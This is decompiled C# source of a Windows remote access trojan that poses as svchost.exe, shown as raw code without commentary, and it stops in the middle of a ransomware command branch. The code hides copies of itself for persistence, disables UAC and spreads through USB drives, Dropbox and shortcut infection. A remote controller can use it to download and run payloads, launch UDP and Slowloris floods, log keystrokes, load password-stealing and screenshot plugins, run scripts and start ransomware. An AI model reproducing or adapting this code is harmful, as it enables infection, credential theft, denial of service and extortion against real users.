using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using svchost.My;

namespace svchost;

[StandardModule]
public sealed class A
{
	public delegate void InvokeDelegate();

	public static string h = "wMve5O8ZqiRnOnv+HydvIw==";

	public static string port = "m2uRXdy9TBOE6FKjnIUK7w==";

	public static string Name = "HacKed";

	public static string Y = "|Black|";

	public static string Ver = "v5.5 [ Hell Mary ]";

	public static string ulink = "True";

	public static string startUP = "ef781910bc5e8aab3761591acadf8bb6";

	public static string exen = "cagohack.exe";

	public static string taskmanager = "True";

	public static string EncryptStatus = "True";

	public static string EncryptKey = "aGNzUCliZHFXUGtuXjZ2R3MpIyQ=";

	public static string BypassS = "True";

	public static string DownloaderStatus = "False";

	public static string DownloadURL = "";

	public static string DownloadPath = "";

	public static string DownloadName = "";

	public static string DownloadSleep = "";

	public static string DownloadKey = "";

	public static string spread;

	public static string UAC = "True";

	public static string BitcoinAddress;

	public static string MTX = "ZhYmK@LHzYUg#9g";

	public static string DropBoxSpread = "True";

	public static Mutex MT = null;

	public static string ransompassword;

	public static string ShortCut = "True";

	public static string PathS = "Temp";

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static object LO = new FileInfo(Application.get_ExecutablePath());

	public static Computer F = new Computer();

	public static TCP C = new TCP();

	public static string s = new FileInfo(Application.get_ExecutablePath()).get_Name();

	public static FileInfo EXE = new FileInfo(Application.get_ExecutablePath());

	public static int st = 0;

	public static Thread trd;

	public static string strin = null;

	public static Process[] GetProcesses;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long BlockInput(long fBlock);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		Install_Server();
		UsbVicTim();
		st = 0;
		trd = new Thread(StartEvrey.StartWork);
		trd.IsBackground = true;
		trd.Start();
		if (Operators.CompareString(DownloaderStatus, "True", false) == 0)
		{
			Downloader downloader = new Downloader();
			downloader.StartDownlaoder(DownloadURL, DownloadPath, DownloadName, DownloadSleep, DownloadKey);
		}
		if (Operators.CompareString(DropBoxSpread, "True", false) == 0)
		{
			DropBoxSpreadFunc(exen);
		}
		if (Operators.CompareString(ulink, "True", false) == 0 && Operators.CompareString(File.ReadAllText(Path.GetTempPath() + "\\BlackData.dat"), "True", false) != 0)
		{
			USB uSB = new USB();
			uSB.ExeName = exen;
			uSB.Start();
		}
		if (Operators.CompareString(UAC, "True", false) == 0)
		{
			UACD();
		}
		if (Operators.CompareString(taskmanager, "True", false) == 0)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					ED();
				});
				pr(1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(BypassS, "True", false) == 0)
		{
			Screening_Programs.Bypass();
		}
		if (Operators.CompareString(ShortCut, "True", false) == 0)
		{
			SortCut_Install.ShortcutInfection();
		}
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (CompDir(new FileInfo(process.MainModule!.FileName), (FileInfo)LO) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(MTX);
			ProjectData.EndApp();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			MT = new Mutex(initiallyOwned: true, MTX);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		string text = "";
		while (true)
		{
			Thread.Sleep(5000);
			string text2 = ACT();
			if (Operators.CompareString(text2, text, false) != 0)
			{
				text = text2;
				C.Send("!1" + Y + text2);
			}
		}
	}

	public static void Transfer(bool Status, string Host, int NewPort, string NewID)
	{
		MySettingsProperty.Settings.NewHost = Host;
		MySettingsProperty.Settings.NewPort = NewPort;
		MySettingsProperty.Settings.TransferStatus = true;
		MySettingsProperty.Settings.ID = NewID;
		((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
	}

	public static void UACD()
	{
		if (!(((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("Vista") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("7") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("8") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("8.1") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("10")))
		{
			return;
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (Operators.CompareString(registryKey.GetValue("EnableLUA")!.ToString(), "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Install_Server()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 415:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0028;
						case 3:
						case 6:
						case 7:
							goto IL_0044;
						case 8:
							goto IL_004c;
						case 10:
							goto IL_006f;
						case 11:
							goto IL_0072;
						case 12:
							goto IL_0099;
						case 13:
							goto IL_00bc;
						case 9:
						case 14:
						case 15:
							goto IL_00e3;
						case 17:
							goto IL_00fd;
						case 18:
							goto IL_0100;
						case 19:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 16:
						case 20:
						case 21:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0100:
					num = 18;
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe");
					break;
					IL_00fd:
					num = 17;
					goto IL_0100;
					IL_0009:
					num = 2;
					if (!Directory.Exists(Interaction.Environ(PathS) + "\\Microsoft"))
					{
						goto IL_0026;
					}
					goto IL_0044;
					IL_0026:
					num = 4;
					goto IL_0028;
					IL_0028:
					num = 5;
					Directory.CreateDirectory(Interaction.Environ(PathS) + "\\Microsoft");
					goto IL_0044;
					IL_0044:
					num = 7;
					text = "Microsoft\\";
					goto IL_004c;
					IL_004c:
					num = 8;
					if (!File.Exists(Interaction.Environ(PathS) + "\\" + text + "svchost.exe"))
					{
						goto IL_006f;
					}
					goto IL_00e3;
					IL_006f:
					num = 10;
					goto IL_0072;
					IL_0072:
					num = 11;
					File.Copy(Application.get_ExecutablePath(), Interaction.Environ(PathS) + "\\" + text + "svchost.exe");
					goto IL_0099;
					IL_0099:
					num = 12;
					File.SetAttributes(Interaction.Environ(PathS) + "\\" + text + "svchost.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_00bc;
					IL_00bc:
					num = 13;
					Exta.AStartup(startUP, Interaction.Environ(PathS) + "\\" + text + "svchost.exe");
					goto IL_00e3;
					IL_00e3:
					num = 15;
					if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe"))
					{
						goto end_IL_0001_3;
					}
					goto IL_00fd;
					end_IL_0001_2:
					break;
				}
				num = 19;
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\svchost.exe", FileAttributes.Hidden | FileAttributes.System);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 415;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = F1.Directory;
		DirectoryInfo directoryInfo2 = F2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void IND(byte[] b)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		string[] array = default(string[]);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		Ping ping = default(Ping);
		PingOptions pingOptions = default(PingOptions);
		string text2 = default(string);
		byte[] bytes = default(byte[]);
		short num5 = default(short);
		kl kl2 = default(kl);
		object obj = default(object);
		kl kl3 = default(kl);
		Assembly assembly = default(Assembly);
		object objectValue = default(object);
		Assembly assembly2 = default(Assembly);
		object objectValue2 = default(object);
		Assembly assembly3 = default(Assembly);
		object objectValue3 = default(object);
		RansomWare ransomWare = default(RansomWare);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				TCP c;
				string[] array3;
				Encoding aSCII;
				object[] array4;
				object[] array5;
				object[] array7;
				object obj3;
				TCP c2;
				string[] array2;
				string[] array9;
				Encoding aSCII2;
				object[] array10;
				object[] array11;
				object obj2;
				object[] array6;
				object[] array12;
				bool[] array8;
				object obj4;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					array = Strings.Split(BS(b), Y, -1, (CompareMethod)0);
					goto IL_0017;
				case 3729:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0017;
						case 3:
							goto IL_0020;
						case 5:
						case 6:
							goto IL_0028;
						case 7:
							goto IL_003d;
						case 9:
							goto IL_0054;
						case 10:
							goto IL_006a;
						case 11:
							goto IL_0073;
						case 12:
							goto IL_007d;
						case 15:
							goto IL_0090;
						case 16:
							goto IL_00a6;
						case 17:
							goto IL_00af;
						case 18:
							goto IL_00b9;
						case 21:
							goto IL_00cc;
						case 22:
							goto IL_00e2;
						case 23:
							goto IL_0100;
						case 24:
							goto IL_010e;
						case 26:
							goto IL_012a;
						case 27:
							goto IL_0140;
						case 28:
							goto IL_0163;
						case 29:
							goto IL_0171;
						case 31:
							goto IL_018d;
						case 32:
							goto IL_01a6;
						case 33:
							goto IL_01af;
						case 34:
							goto IL_01b9;
						case 35:
							goto IL_01bd;
						case 36:
							goto IL_01c8;
						case 37:
							goto IL_01d4;
						case 38:
							goto IL_01e1;
						case 39:
							goto IL_01ec;
						case 40:
							goto IL_01fd;
						case 42:
							goto IL_0206;
						case 41:
							goto IL_021d;
						case 44:
							goto IL_0235;
						case 45:
							goto IL_024b;
						case 47:
							goto IL_026b;
						case 48:
							goto IL_0281;
						case 50:
							goto IL_028f;
						case 51:
							goto IL_02a5;
						case 53:
							goto IL_02b7;
						case 54:
							goto IL_02cd;
						case 56:
							goto IL_02f8;
						case 57:
							goto IL_030e;
						case 59:
							goto IL_0325;
						case 60:
							goto IL_033b;
						case 62:
							goto IL_0352;
						case 63:
							goto IL_0368;
						case 65:
							goto IL_037f;
						case 66:
							goto IL_0395;
						case 67:
							goto IL_03a0;
						case 68:
							goto IL_03ba;
						case 70:
							goto IL_03db;
						case 71:
							goto IL_03f1;
						case 72:
							goto IL_03fc;
						case 74:
							goto IL_0464;
						case 75:
							goto IL_047d;
						case 76:
							goto IL_049d;
						case 77:
							goto IL_04b7;
						case 78:
							goto IL_04ce;
						case 80:
							goto IL_054c;
						case 81:
							goto IL_0565;
						case 82:
							goto IL_0585;
						case 83:
							goto IL_059f;
						case 84:
							goto IL_05b6;
						case 85:
							goto IL_05d2;
						case 86:
							goto IL_05e0;
						case 88:
							goto IL_0655;
						case 89:
							goto IL_066e;
						case 90:
							goto IL_0691;
						case 91:
							goto IL_06ae;
						case 92:
							goto IL_06d0;
						case 93:
							goto IL_06ea;
						case 94:
							goto IL_0704;
						case 96:
							goto IL_07fb;
						case 97:
							goto IL_0815;
						case 99:
							goto IL_090c;
						case 100:
							goto IL_0926;
						case 103:
							goto IL_09b6;
						case 104:
							goto IL_09ba;
						case 107:
							goto IL_09db;
						case 108:
							goto IL_09f1;
						case 109:
							goto IL_0a0f;
						case 111:
							goto IL_0a30;
						case 112:
							goto IL_0a46;
						case 114:
							goto IL_0a63;
						case 115:
							goto IL_0a79;
						case 116:
							goto IL_0a84;
						case 117:
							goto IL_0a90;
						case 118:
							goto IL_0a9c;
						case 120:
							goto IL_0ac3;
						case 121:
							goto IL_0ad9;
						case 122:
							goto IL_0afe;
						case 124:
							goto IL_0b2d;
						case 125:
							goto IL_0b43;
						case 126:
							goto IL_0b4c;
						case 128:
							goto IL_0b64;
						case 129:
							goto IL_0b7d;
						case 130:
							goto IL_0b9e;
						case 131:
							goto IL_0baf;
						case 134:
							goto IL_0bd0;
						case 135:
							goto IL_0be9;
						case 136:
							goto IL_0bf2;
						case 137:
							goto IL_0c03;
						case 138:
							goto IL_0c0f;
						case 139:
							goto IL_0c1c;
						case 140:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 8:
						case 13:
						case 14:
						case 19:
						case 20:
						case 25:
						case 30:
						case 43:
						case 46:
						case 49:
						case 52:
						case 55:
						case 58:
						case 61:
						case 64:
						case 69:
						case 73:
						case 79:
						case 87:
						case 95:
						case 98:
						case 101:
						case 102:
						case 105:
						case 106:
						case 110:
						case 113:
						case 119:
						case 123:
						case 127:
						case 132:
						case 133:
						case 141:
						case 142:
						case 143:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0be9:
					ProjectData.ClearProjectError();
					num3 = -4;
					goto IL_0bf2;
					IL_0bd0:
					num = 134;
					if (Operators.CompareString(text, "uninstall", false) != 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0be9;
					IL_0017:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0020;
					IL_0020:
					num = 3;
					text = array[0];
					goto IL_0028;
					IL_0028:
					num = 6;
					if (Operators.CompareString(text, "ping", false) == 0)
					{
						goto IL_003d;
					}
					goto IL_0054;
					IL_003d:
					num = 7;
					C.Send("ping");
					goto end_IL_0001_3;
					IL_0054:
					num = 9;
					if (Operators.CompareString(text, "CloseServer", false) == 0)
					{
						goto IL_006a;
					}
					goto IL_0090;
					IL_006a:
					num = 10;
					ED();
					goto IL_0073;
					IL_0073:
					num = 11;
					pr(0);
					goto IL_007d;
					IL_007d:
					num = 12;
					Application.Exit();
					ProjectData.EndApp();
					goto end_IL_0001_3;
					IL_0090:
					num = 15;
					if (Operators.CompareString(text, "RestartServer", false) == 0)
					{
						goto IL_00a6;
					}
					goto IL_00cc;
					IL_00a6:
					num = 16;
					ED();
					goto IL_00af;
					IL_00af:
					num = 17;
					pr(0);
					goto IL_00b9;
					IL_00b9:
					num = 18;
					Application.Restart();
					ProjectData.EndApp();
					goto end_IL_0001_3;
					IL_00cc:
					num = 21;
					if (Operators.CompareString(text, "sendfile", false) == 0)
					{
						goto IL_00e2;
					}
					goto IL_012a;
					IL_00e2:
					num = 22;
					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
					goto IL_0100;
					IL_0100:
					num = 23;
					Thread.Sleep(1000);
					goto IL_010e;
					IL_010e:
					num = 24;
					Process.Start(Path.GetTempPath() + array[1]);
					goto end_IL_0001_3;
					IL_012a:
					num = 26;
					if (Operators.CompareString(text, "download", false) == 0)
					{
						goto IL_0140;
					}
					goto IL_018d;
					IL_0140:
					num = 27;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], Path.GetTempPath() + array[2]);
					goto IL_0163;
					IL_0163:
					num = 28;
					Thread.Sleep(1000);
					goto IL_0171;
					IL_0171:
					num = 29;
					Process.Start(Path.GetTempPath() + array[2]);
					goto end_IL_0001_3;
					IL_018d:
					num = 31;
					if (Operators.CompareString(text, "UDP", false) == 0)
					{
						goto IL_01a6;
					}
					goto IL_0235;
					IL_01a6:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_01af;
					IL_01af:
					num = 33;
					ping = new Ping();
					goto IL_01b9;
					IL_01b9:
					num = 34;
					goto IL_01bd;
					IL_01bd:
					num = 35;
					pingOptions = new PingOptions();
					goto IL_01c8;
					IL_01c8:
					num = 36;
					pingOptions.DontFragment = true;
					goto IL_01d4;
					IL_01d4:
					num = 37;
					pingOptions.Ttl = 64;
					goto IL_01e1;
					IL_01e1:
					num = 38;
					text2 = "JE7&I&e56436CZRNPHM16IGZ5jZ4WG3057e^H1%RTIBC^Y#TMG0$ACZ881ZI^j6V2J4U%5J4&^^3j5E1#WS55IZPJR8#N#7J#7Re7eAWR&$GT4!0#$H^4T7I7He&Wrj$7^5eJEX7E5j$TK@8@Ee1M7UL$4WQMeW6ZTMMIOjeN63&251#rj3GS2T^3@3YGr$J4P22jNW7EXE0V#326J&XXDr#jKTJL#EI10ZX866MW4#@8PjTj&JU#Jj!T&65r61W1G$HIHPJMe7M3^&JG&WG4HR#EZ&&W$NRYUG3T!5IULKe";
					goto IL_01ec;
					IL_01ec:
					num = 39;
					bytes = Encoding.ASCII.GetBytes(text2);
					goto IL_01fd;
					IL_01fd:
					num = 40;
					num5 = 0;
					goto IL_021d;
					IL_021d:
					num = 41;
					ping.Send(array[1], 20000, bytes, pingOptions);
					goto IL_0206;
					IL_0206:
					num = 42;
					num5 = checked((short)unchecked(num5 + 1));
					if (num5 > 1000)
					{
						goto end_IL_0001_3;
					}
					goto IL_021d;
					IL_0235:
					num = 44;
					if (Operators.CompareString(text, "startSlowloris", false) == 0)
					{
						goto IL_024b;
					}
					goto IL_026b;
					IL_024b:
					num = 45;
					Slowloris.StartSlowloris(array[1], 1000, 10000, "JE7&I&e56436CZRNPHM16IGZ5jZ4WG3057e^H1%RTIBC^Y#TMG0$ACZ881ZI^j6V2J4U%5J4&^^3j5E1#WS55IZPJR8#N#7J#7Re7eAWR&$GT4!0#$H^4T7I7He&Wrj$7^5eJEX7E5j$TK@8@Ee1M7UL$4WQMeW6ZTMMIOjeN63&251#rj3GS2T^3@3YGr$J4P22jNW7EXE0V#326J&XXDr#jKTJL#EI10ZX866MW4#@8PjTj&JU#Jj!T&65r61W1G$HIHPJMe7M3^&JG&WG4HR#EZ&&W$NRYUG3T!5IULKe");
					goto end_IL_0001_3;
					IL_026b:
					num = 47;
					if (Operators.CompareString(text, "stopSlowloris", false) == 0)
					{
						goto IL_0281;
					}
					goto IL_028f;
					IL_0281:
					num = 48;
					Slowloris.StopSlowloris();
					goto end_IL_0001_3;
					IL_028f:
					num = 50;
					if (Operators.CompareString(text, "OpenPage", false) == 0)
					{
						goto IL_02a5;
					}
					goto IL_02b7;
					IL_02a5:
					num = 51;
					Process.Start(array[1]);
					goto end_IL_0001_3;
					IL_02b7:
					num = 53;
					if (Operators.CompareString(text, "BlocKPage", false) == 0)
					{
						goto IL_02cd;
					}
					goto IL_02f8;
					IL_02cd:
					num = 54;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1  " + array[1], true);
					goto end_IL_0001_3;
					IL_02f8:
					num = 56;
					if (Operators.CompareString(text, "Logoff", false) == 0)
					{
						goto IL_030e;
					}
					goto IL_0325;
					IL_030e:
					num = 57;
					Interaction.Shell("shutdown -l -t 00", (AppWinStyle)0, false, -1);
					goto end_IL_0001_3;
					IL_0325:
					num = 59;
					if (Operators.CompareString(text, "Restart", false) == 0)
					{
						goto IL_033b;
					}
					goto IL_0352;
					IL_033b:
					num = 60;
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
					goto end_IL_0001_3;
					IL_0352:
					num = 62;
					if (Operators.CompareString(text, "Shutdown", false) == 0)
					{
						goto IL_0368;
					}
					goto IL_037f;
					IL_0368:
					num = 63;
					Interaction.Shell("shutdown -s -t 00", (AppWinStyle)0, false, -1);
					goto end_IL_0001_3;
					IL_037f:
					num = 65;
					if (Operators.CompareString(text, "keystart", false) == 0)
					{
						goto IL_0395;
					}
					goto IL_03db;
					IL_0395:
					num = 66;
					kl2 = new kl();
					goto IL_03a0;
					IL_03a0:
					num = 67;
					obj = new Thread(kl2.WRK, 1);
					goto IL_03ba;
					IL_03ba:
					num = 68;
					NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto end_IL_0001_3;
					IL_03db:
					num = 70;
					if (Operators.CompareString(text, "keydump", false) == 0)
					{
						goto IL_03f1;
					}
					goto IL_0464;
					IL_03f1:
					num = 71;
					kl3 = new kl();
					goto IL_03fc;
					IL_03fc:
					num = 72;
					C.Send("keydump" + Y + File.ReadAllText(kl3.LogsPath) + Y + Name + "_" + HWD());
					goto end_IL_0001_3;
					IL_0464:
					num = 74;
					if (Operators.CompareString(text, "getpass", false) == 0)
					{
						goto IL_047d;
					}
					goto IL_054c;
					IL_047d:
					num = 75;
					File.WriteAllBytes(Path.GetTempPath() + "\\pwd.dll", Convert.FromBase64String(array[1]));
					goto IL_049d;
					IL_049d:
					num = 76;
					assembly = Assembly.LoadFile(Path.GetTempPath() + "\\pwd.dll");
					goto IL_04b7;
					IL_04b7:
					num = 77;
					objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance("PasswordPlugin.SteelPassword"));
					goto IL_04ce;
					IL_04ce:
					num = 78;
					NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("sendpass" + Y), NewLateBinding.LateGet(objectValue, (Type)null, "Dump", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)Y), (object)Name), (object)"_"), (object)HWD()) }, (string[])null, (Type[])null, (bool[])null, true);
					goto end_IL_0001_3;
					IL_054c:
					num = 80;
					if (Operators.CompareString(text, "getdesktop", false) == 0)
					{
						goto IL_0565;
					}
					goto IL_0655;
					IL_0565:
					num = 81;
					File.WriteAllBytes(Path.GetTempPath() + "\\desktop.dll", Convert.FromBase64String(array[1]));
					goto IL_0585;
					IL_0585:
					num = 82;
					assembly2 = Assembly.LoadFile(Path.GetTempPath() + "\\desktop.dll");
					goto IL_059f;
					IL_059f:
					num = 83;
					objectValue2 = RuntimeHelpers.GetObjectValue(assembly2.CreateInstance("DesktopShot.ScreenShot"));
					goto IL_05b6;
					IL_05b6:
					num = 84;
					NewLateBinding.LateCall(objectValue2, (Type)null, "Dump", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_05d2;
					IL_05d2:
					num = 85;
					Thread.Sleep(1000);
					goto IL_05e0;
					IL_05e0:
					num = 86;
					C.Send("sendesktop" + Y + Convert.ToBase64String(File.ReadAllBytes(Path.GetTempPath() + "\\hell.png")) + Y + Name + "_" + HWD());
					goto end_IL_0001_3;
					IL_0655:
					num = 88;
					if (Operators.CompareString(text, "custom", false) == 0)
					{
						goto IL_066e;
					}
					goto IL_09db;
					IL_066e:
					num = 89;
					File.WriteAllBytes(Path.GetTempPath() + "\\" + array[1], Convert.FromBase64String(array[2]));
					goto IL_0691;
					IL_0691:
					num = 90;
					assembly3 = Assembly.LoadFile(Path.GetTempPath() + "\\" + array[1]);
					goto IL_06ae;
					IL_06ae:
					num = 91;
					objectValue3 = RuntimeHelpers.GetObjectValue(assembly3.CreateInstance(array[3] + "." + array[4]));
					goto IL_06d0;
					IL_06d0:
					num = 92;
					if (Operators.CompareString(array[5], "True", false) == 0)
					{
						goto IL_06ea;
					}
					goto IL_09b6;
					IL_06ea:
					num = 93;
					if (Operators.CompareString(array[6], "png", false) == 0)
					{
						goto IL_0704;
					}
					goto IL_07fb;
					IL_0704:
					num = 94;
					c = C;
					array2 = new string[9] { "customoutput", Y, null, null, null, null, null, null, null };
					array3 = array2;
					aSCII = Encoding.ASCII;
					array4 = new object[1];
					array5 = array4;
					obj2 = objectValue3;
					array5[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null));
					array6 = array4;
					array7 = array6;
					array8 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet((object)aSCII, (Type)null, "GetBytes", array7, (string[])null, (Type[])null, array8);
					if (array8[0])
					{
						NewLateBinding.LateSetComplex(obj2, (Type)null, "BlackPlugin", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
					}
					array3[2] = Convert.ToBase64String((byte[])obj3);
					array2[3] = Y;
					array2[4] = Name;
					array2[5] = "_";
					array2[6] = HWD();
					array2[7] = Y;
					array2[8] = array[6];
					c.Send(string.Concat(array2));
					goto end_IL_0001_3;
					IL_0c03:
					num = 137;
					ED();
					goto IL_0c0f;
					IL_0bf2:
					num = 136;
					((ApplicationSettingsBase)MySettingsProperty.Settings).Reset();
					goto IL_0c03;
					IL_07fb:
					num = 96;
					if (Operators.CompareString(array[6], "exe", false) == 0)
					{
						goto IL_0815;
					}
					goto IL_090c;
					IL_0815:
					num = 97;
					c2 = C;
					array2 = new string[9] { "customoutput", Y, null, null, null, null, null, null, null };
					array9 = array2;
					aSCII2 = Encoding.ASCII;
					array10 = new object[1];
					array11 = array10;
					obj2 = objectValue3;
					array11[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null));
					array6 = array10;
					array12 = array6;
					array8 = new bool[1] { true };
					obj4 = NewLateBinding.LateGet((object)aSCII2, (Type)null, "GetBytes", array12, (string[])null, (Type[])null, array8);
					if (array8[0])
					{
						NewLateBinding.LateSetComplex(obj2, (Type)null, "BlackPlugin", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
					}
					array9[2] = Convert.ToBase64String((byte[])obj4);
					array2[3] = Y;
					array2[4] = Name;
					array2[5] = "_";
					array2[6] = HWD();
					array2[7] = Y;
					array2[8] = array[6];
					c2.Send(string.Concat(array2));
					goto end_IL_0001_3;
					IL_0c1c:
					num = 139;
					Exta.DStartup(startUP);
					break;
					IL_0c0f:
					num = 138;
					pr(0);
					goto IL_0c1c;
					IL_090c:
					num = 99;
					if (Operators.CompareString(array[6], "txt", false) != 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0926;
					IL_0926:
					num = 100;
					NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("customoutput" + Y), NewLateBinding.LateGet(objectValue3, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)Y), (object)Name), (object)"_"), (object)HWD()), (object)Y), (object)array[6]) }, (string[])null, (Type[])null, (bool[])null, true);
					goto end_IL_0001_3;
					IL_09b6:
					num = 103;
					goto IL_09ba;
					IL_09ba:
					num = 104;
					NewLateBinding.LateCall(objectValue3, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto end_IL_0001_3;
					IL_09db:
					num = 107;
					if (Operators.CompareString(text, "execscrip", false) == 0)
					{
						goto IL_09f1;
					}
					goto IL_0a30;
					IL_09f1:
					num = 108;
					File.WriteAllText(Path.GetTempPath() + "\\Script." + array[2], array[1]);
					goto IL_0a0f;
					IL_0a0f:
					num = 109;
					Process.Start(Path.GetTempPath() + "\\Script." + array[2]);
					goto end_IL_0001_3;
					IL_0a30:
					num = 111;
					if (Operators.CompareString(text, "transfer", false) == 0)
					{
						goto IL_0a46;
					}
					goto IL_0a63;
					IL_0a46:
					num = 112;
					Transfer(Status: true, array[1], Conversions.ToInteger(array[2]), array[3]);
					goto end_IL_0001_3;
					IL_0a63:
					num = 114;
					if (Operators.CompareString(text, "startransom", false) == 0)
					{
						goto IL_0a79;
					}
					goto IL_0ac3;
					IL_0a79:
					num = 115;
